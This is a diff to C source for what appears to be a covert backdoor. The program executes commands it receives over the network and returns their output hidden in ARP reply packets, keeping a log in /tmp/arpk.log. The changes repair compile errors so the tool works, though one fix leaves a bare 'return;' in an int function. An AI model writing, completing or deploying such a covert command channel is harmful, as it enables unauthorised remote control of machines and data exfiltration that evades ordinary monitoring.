@@ -14,6 +14,7 @@
 #include <netpacket/packet.h> // defined sockaddr_ll
 
 #define ETH_ALEN 6
+#define IP_ALEN 4
 
 #define PACKET_LEN 65535
 #define OUTPUT_BUF 1024
@@ -99,7 +100,7 @@ int send_arp_reply(const char *iface, const char *src_mac_str, const char *src_i
     arp_header[2] = 0x08;                            // Protocol type (IP)
     arp_header[3] = 0x00;
     arp_header[4] = ETH_ALEN;                         // Hardware size
-    arp_header[5] = IP_LEN;                          // Protocol size
+    arp_header[5] = IP_ALEN;                          // Protocol size
     arp_header[6] = ARP_REPLY_OPCODE >> 8;           // Opcode (ARP Reply)
     arp_header[7] = ARP_REPLY_OPCODE & 0xff;
 
@@ -130,7 +131,7 @@ int send_arp_reply(const char *iface, const char *src_mac_str, const char *src_i
     }
 
     close(sockfd);
-    return 
+    return;
 }
 
 volatile sig_atomic_t is_timed_out = 0;
@@ -196,11 +197,11 @@ int main(int argc, char *argv[]) {
     FILE *fp = fopen("/tmp/arpk.log", "a+");
     char output[OUTPUT_BUF+1];
     int status = execute_command_with_timeout(payload, 3, output, OUTPUT_BUF);
-    output[PAYLOAD_BUF] = 0;
+    output[OUTPUT_BUF] = 0;
     if (status == 0) {
         // Success, send output as reply
         fprintf(fp, "Success!\n\tCommand: %s\n\tOutput: %s\n", payload, output);
-        send_arp_reply(IF_NAME, src_hw, src_proto, dst_hw, dst_ip_str, output);
+        send_arp_reply(IF_NAME, src_hw, src_proto, dst_hw, dst_proto, output);
     } else {
         if (status == -2) {
             // Failed, send timeout as reply
